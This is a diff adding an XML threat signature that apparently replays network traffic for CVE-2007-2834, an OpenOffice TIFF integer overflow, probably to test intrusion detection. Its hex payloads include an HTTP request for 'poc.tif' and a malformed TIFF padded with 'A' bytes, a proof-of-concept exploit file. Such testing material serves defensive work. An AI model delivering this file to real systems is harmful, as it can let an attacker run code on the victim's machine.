@@ -1,0 +1,118 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="OpenOffice TIFF File Parsing Integer Overflow"/>
+    <EngDesc display="true" value="An integer overflow vulnerability exists in the OpenOffice software suite. The vulnerability is due to the way OpenOffice parses Tagged Image File Format (TIFF) images. A remote attacker could exploit this vulnerability by persuading a user to open a malicious TIFF file, potentially causing arbitrary code to be injected and executed in the security context of the logged in user. "/>
+    <Intent display="true">
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="OpenOffice"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="OpenOffice_OpenOffice"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="OpenOffice_OpenOffice_2.3.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20070917-14"/>
+    <CVEID display="true" value="CVE-2007-2834"/>
+    <bugtraqID display="true" value="25690"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="0417224f5ddbd7b17fc25b3ab7c02983"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="true"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633319057843988750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1204070177" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="F">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="G">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="H">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F7E617A68616E672F706F632E74696620485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E30290D0A486F73743A203137322E31362E312E320D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2,3">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="000000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C2031392053657020323030372030303A35313A323420474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E39206D6F645F707974686F6E2F332E312E3320507974686F6E2F322E332E34206D6F645F7065726C2F322E302E31205065726C2F76352E382E350D0A4C6173742D4D6F6469666965643A205765642C2031392053657020323030372030303A35303A333520474D540D0A455461673A20223265383930362D3131302D3663656430636330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203237320D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20696D6167652F746966660D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="H" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="4D4D002A0000000800120117000440000000000000FF01000003000000010100000041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
